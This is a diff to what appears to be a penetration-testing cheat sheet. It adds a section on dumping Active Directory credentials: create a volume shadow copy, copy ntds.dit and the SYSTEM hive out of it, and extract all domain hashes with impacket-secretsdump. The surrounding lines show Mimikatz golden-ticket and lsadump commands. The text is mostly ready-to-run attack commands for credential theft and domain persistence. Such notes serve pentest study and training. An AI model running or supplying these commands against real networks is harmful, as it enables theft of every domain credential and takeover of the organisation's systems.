@@ -755,7 +755,6 @@ lsadump::lsa /patch
 kerberos::purge
 
 kerberos::golden /user:jen /domain:corp.com /sid:<DC sid> /krbtgt:<NTLM hash> /ptt
-
 ```
 #### Get access to Domain controller
 ```javascript
@@ -769,6 +768,18 @@ After this the jen user will be part of the domain adminsgroup !!
 
 only make use of the domain name like \\dc1 don't put IP you will not get access !!
 ```
+
+### Shadow Copies [only as Domain Admin]
+```javascript
+in Windows:
+vshadow.exe -nw -p C:
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
+reg.exe save hklm\system c:\system.bak
+
+#transfer these files to local kali machine and get all the hashes !!
+impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
+```
+
 
 ### Forced Password Change Using rpcclient
 
